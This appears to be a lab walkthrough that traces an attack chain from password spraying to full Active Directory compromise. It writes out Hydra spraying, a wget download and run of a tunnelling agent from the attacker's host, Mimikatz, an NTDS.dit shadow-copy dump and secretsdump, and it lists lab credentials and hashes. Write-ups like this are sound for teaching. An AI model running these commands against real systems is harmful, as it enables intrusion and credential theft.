## Initial Access — Username Enumeration & Password Spraying

The attack began with a publicly known employee name:

```
Betty Jayde
```

Using this information, a username list was generated with:
10.129.234.116
```
namebuster "Betty Jayde" > username.txt
```

This produced potential usernames based on common corporate naming conventions.

## Password Spraying with Hydra

With a list of possible usernames, a password spraying attack was performed against the SSH service:

```
hydra -L username.txt -p 'Texas123!@#' 10.129.234.116 ssh
```

## Result

```
[22][ssh] host: 10.129.234.116 login: jbetty password: Texas123!@#
```

A valid credential was discovered:

```
Username: jbetty  
Password: Texas123!@#
```

## Gaining Initial Foothold

Using the discovered credentials, SSH access to the DMZ host was obtained:

```
sshpass -p 'Texas123!@#' ssh jbetty@x.x.x.x
```

This marked the first successful foothold inside the environment.

## Pivoting into the Internal Network with Ligolo-ng

After gaining SSH access to the DMZ host (`DMZ01`) as `jbetty`, the next objective was to access the internal network:

```
172.16.119.0/24
```

Since this network was not directly reachable from the attacker machine, a tunnel was required.

## Setting Up the Ligolo Interface (Attacker Machine)

First, a TUN interface was created on the attacker machine:

```
sudo ip tuntap add user <attacker_username> mode tun ligolo  
sudo ip link set ligolo up
```

This interface acts as a virtual network device that will route traffic through the tunnel.

## Starting the Ligolo Proxy

The Ligolo proxy was started on the attacker machine:

```
sudo ./proxy -selfcert
```

## Output

```
Listening on 0.0.0.0:11601
```

This opened a listener for incoming agent connections.

## Transferring the Ligolo Agent to the Target

From the compromised DMZ host, the Ligolo agent was downloaded:

```
wget http://10.10.14.118:8000/agent
```

After downloading, execution permissions were added:

```
chmod +x agent
```

## Establishing the Tunnel

The agent was executed to connect back to the attacker:

```
./agent -connect 10.10.14.118:11601 -ignore-cert
```

## Result

```
Connection established addr="10.10.14.118:11601"
```

This created a reverse tunnel between the DMZ host and the attacker machine.

## Routing Internal Traffic

With the tunnel established, a route was added on the attacker machine:

```
sudo ip route add 172.16.119.0/24 dev ligolo
```

This ensured that all traffic destined for the internal network would pass through the tunnel.

## Activating the Tunnel

Inside the Ligolo proxy interface:

``[Agent : jbetty@DMZ01] » start``

This activated the tunnel, enabling full network access.

> **_Since Ligolo-ng itself isn’t really explained in detail in the module, I wrote a separate practical guide for anyone who wants to understand it better._**

## Result — Internal Network Access

At this point, the attacker gained direct access to internal systems:

```
- JUMP01
- FILE01
- DC01
```

All traffic to the internal subnet was transparently routed through the compromised host.

## Credential Discovery — Shell History

During enumeration, credentials were discovered in shell history:

```
history | grep -iE "mysql|psql|ssh|password|conn"
```

Result:

```
sshpass -p "dealer-scr*********" ssh hwilliam@file01
```
dealer-screwed-gym1
This is a classic example of poor operational security (OPSEC).

## Lateral Movement — RDP Access

Using discovered credentials, RDP access to an internal system was achieved:

```
xfreerdp /u:hwilliam /p:'dealer-scr*********' /v:172.16.119.7
```

This provided a more privileged foothold inside the internal network.

## Sensitive Data Exposure — HR Archive

From the internal host, access to file shares revealed:
```
Employee-Passwords_OLD.psafe3
```

![](https://miro.medium.com/v2/resize:fit:644/1*D2cD19U5Il9orSaS4CNRdw.png)
![Pasted image 20260524185011](/VaultSite/wiki-images/Pasted%20image%2020260524185011.png)
A password vault containing employee credentials.

## Cracking the Vault

The vault was converted and cracked using John:

```
pwsafe2john Employee-Passwords_OLD.psafe3 > pwhash.txt  
john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwhash.txt
```

Recovered credentials:

```
jbetty   : xiao-nicer-wheels5  
bdavid   : caramel-cig**********  
stom     : fails-nibble-disturb4  
hwilliam : warned-wobble-occur8
```

This demonstrates how **archived credentials can become a major security risk**.

## RDP Access as bdavid

After cracking the Password Safe vault, valid credentials for multiple users were recovered. One of the most valuable accounts was:

```
bdavid : caramel-cig**********
```

Using these credentials, Remote Desktop access was established to an internal host:

```
xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'caramel-cig**********'
```

This provided interactive access to the system **JUMP01**.

## Enumerating Privileges

Once logged in, privilege enumeration was performed:

```
whoami /priv
```

## Key Findings

```
SeDebugPrivilege          Enabled  
SeImpersonatePrivilege    Enabled
```

## Group Membership

Further enumeration revealed group membership:

```
whoami /groups
```

## Important Result

```
BUILTIN\Administrators
```

This confirmed that `bdavid` had **local administrator privileges** on the host.

## Transition to Credential Dumping

With these privileges, tools like **Mimikatz** can be used to:

```
- access LSASS memory
- extract credentials
- recover hashes and cleartext passwords
```

This is exactly what enabled the next step in the attack chain: **credential dumping and further lateral movement**.

## Credential Dumping — Mimikatz

With elevated privileges, Mimikatz was used:

```
privilege::debug  
token::elevate  
sekurlsa::logonpasswords
```

This revealed a critical cleartext password:

```
`stom : calves-**rp-****ni`***
```

## Domain Controller Access

Using the recovered password:

```
xfreerdp3 /u:stom /p:'calves-**rp-****ni***' /v:172.16.119.11
```

Access to the **Domain Controller** was achieved.


## Dumping Active Directory (NTDS.dit)

After obtaining **SYSTEM-level access on the domain controller**, the next objective was to extract the Active Directory database.

The AD database is stored in:

```
C:\Windows\NTDS\NTDS.dit
```

However, this file is locked by the system, so it cannot be copied directly.

## Creating a Volume Shadow Copy

To bypass file locks, a shadow copy of the disk was created:

```
vssadmin create shadow /for=C:
```

This creates a snapshot of the filesystem that allows access to otherwise locked files.

## Extracting NTDS.dit

Using the shadow copy path, the database was copied:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

## Dumping the SYSTEM Hive

In addition to `NTDS.dit`, the **SYSTEM registry hive** must also be extracted:

```
reg.exe save hklm\system C:\NTDS\SYSTEM
```

## Why the SYSTEM Hive Is Required

The SYSTEM hive contains the **Boot Key**, which is used to encrypt credentials inside `NTDS.dit`.

Without this file:

- password hashes cannot be decrypted
- the database is effectively unusable

Together, these two files enable offline credential extraction:

NTDS.dit  → contains encrypted credentials    
SYSTEM    → contains decryption key (BootKey)

## Key Takeaway

> _Dumping NTDS.dit without the SYSTEM hive is useless — both are required to fully compromise Active Directory._

## Full Domain Credential Dump

Using Impacket:

```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Key results:

```
Administrator : 36e09e1e6ade94d63***************  
krbtgt       : 11dee8f685882eb4f78a450291569bd0
```

## The Critical Finding — KRBTGT

Compromising the **KRBTGT account** allows:

- Golden Ticket creation
- authentication as any user
- persistent domain access

At this point, the domain is fully compromised.

## Attack Path Overview

OSINT (Betty Jayde)  
        ↓  
Username generation (namebuster)  
        ↓  
Password spraying (Hydra)  
        ↓  
SSH access (DMZ01)  
        ↓  
Ligolo pivot  
        ↓  
Credential discovery (.bash_history)  
        ↓  
RDP (hwilliam)  
        ↓  
Password vault cracked  
        ↓  
RDP (bdavid)  
        ↓  
Privilege escalation (SeImpersonate)  
        ↓  
Mimikatz → stom creds  
        ↓  
RDP (DC01)  
        ↓  
NTDS + SYSTEM dump  
        ↓  
KRBTGT → Full domain compromise